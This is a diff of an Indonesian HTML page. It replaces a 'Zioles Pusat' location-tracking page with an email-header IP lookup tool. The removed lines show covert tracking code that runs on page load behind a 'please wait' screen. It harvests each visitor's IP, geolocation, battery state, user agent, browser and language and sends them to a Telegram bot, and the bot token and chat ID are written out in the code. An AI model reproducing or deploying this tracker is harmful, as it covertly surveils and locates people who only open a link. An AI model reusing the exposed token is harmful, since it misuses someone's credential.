@@ -3,77 +3,91 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Lacak Lokasi - Zioles Pusat</title>
-    <script>
-        async function getBatteryStatus() {
-            if ('getBattery' in navigator) {
-                const battery = await navigator.getBattery();
-                const level = Math.round(battery.level * 100);
-                const charging = battery.charging ? "🔌 Sedang mengisi daya" : "⚡ Tidak mengisi daya";
-                return `Baterai: ${level}% (${charging})`;
-            } 
-            return "Baterai: Tidak didukung";
+    <title>Pelacak IP Email</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            padding: 0;
+            text-align: center;
+            background-color: #f4f4f4;
         }
-
-        async function getIP() {
-            try {
-                let response = await fetch("https://ipapi.co/json/");
-                let data = await response.json();
-                
-                let ip = data.ip;
-                let negara = data.country_name;
-                let kodeNegara = data.country_code;
-                let provinsi = data.region;
-                let kota = data.city;
-
-                // Blokir akses jika bukan dari Indonesia
-                if (kodeNegara !== "ID") {
-                    document.body.innerHTML = "<h1>Akses Ditolak</h1><p>Hanya pengguna dari Indonesia yang dapat mengakses halaman ini.</p>";
-                    return; // Hentikan proses jika bukan dari Indonesia
-                }
-
-                let batteryStatus = await getBatteryStatus();
-
-                let userAgent = navigator.userAgent;
-                let browser = navigator.vendor || "Tidak diketahui";
-                let bahasa = navigator.language;
-
-                // Kirim ke bot Telegram
-                let botToken = "7779236534:AAEU6uV3iQxsPmBqv77YM1puM4H9bRXmvyE"; // Ganti dengan token bot Anda
-                let chatID = "7799140879"; // Ganti dengan ID chat Anda
-
-                let message = `
-🚀 *Zioles Pusat - Lacak Info Pengguna* 🚀
-━━━━━━━━━━━━━━━━━━━━
-🌍 **Informasi Pengguna**
-- 📍 *IP:* ${ip}
-- 🏴 *Negara:* ${negara}
-- 🏙️ *Provinsi:* ${provinsi}
-- 🏠 *Kota:* ${kota}
-- 🔋 *${batteryStatus}*
-- 🖥️ *User Agent:* ${userAgent}
-- 🌐 *Browser:* ${browser}
-- 🗣️ *Bahasa:* ${bahasa}
-━━━━━━━━━━━━━━━━━━━━
-📢 *Data ini dikumpulkan oleh sistem Zioles Pusat.*
-                `;
-
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
-                    .then(response => {
-                        if (!response.ok) throw new Error("Gagal mengirim ke Telegram");
-                    })
-                    .catch(error => console.error("Error:", error));
-
-            } catch (error) {
-                console.error("Gagal mengambil data:", error);
-            }
+        h2 {
+            color: #333;
         }
-
-        window.onload = getIP;
-    </script>
+        textarea {
+            width: 90%;
+            height: 150px;
+            margin-bottom: 10px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            background-color: #28a745;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        button:hover {
+            background-color: #218838;
+        }
+        .result {
+            margin-top: 20px;
+            padding: 10px;
+            background: white;
+            display: none;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+    </style>
 </head>
 <body>
-    <h1>Mohon Tunggu...</h1>
-    <p>Sedang memuat informasi...</p>
+
+    <h2>Pelacak IP dari Header Email</h2>
+    <textarea id="emailHeader" placeholder="Tempelkan header email di sini..."></textarea>
+    <br>
+    <button onclick="trackIP()">Lacak IP</button>
+    
+    <div class="result" id="result">
+        <h3>Hasil Pelacakan:</h3>
+        <p><b>IP Pengirim:</b> <span id="ipAddress"></span></p>
+        <p><b>Lokasi:</b> <span id="location"></span></p>
+        <p><b>ISP:</b> <span id="isp"></span></p>
+        <p><b>Koordinat:</b> <span id="coordinates"></span></p>
+    </div>
+
+    <script>
+        function extractIP(header) {
+            const pattern = /Received: from .* (\d+\.\d+\.\d+\.\d+)/g;
+            let matches = [...header.matchAll(pattern)];
+            return matches.length ? matches[matches.length - 1][1] : null;
+        }
+
+        function trackIP() {
+            let headerText = document.getElementById("emailHeader").value;
+            let ip = extractIP(headerText);
+
+            if (!ip) {
+                alert("Alamat IP tidak ditemukan dalam header email!");
+                return;
+            }
+
+            document.getElementById("ipAddress").textContent = ip;
+            document.getElementById("result").style.display = "block";
+
+            fetch(`https://ipinfo.io/${ip}/json`)
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById("location").textContent = `${data.city}, ${data.region}, ${data.country}`;
+                    document.getElementById("isp").textContent = data.org;
+                    document.getElementById("coordinates").textContent = data.loc;
+                })
+                .catch(error => console.error("Gagal mendapatkan data IP", error));
+        }
+    </script>
+
 </body>
 </html>
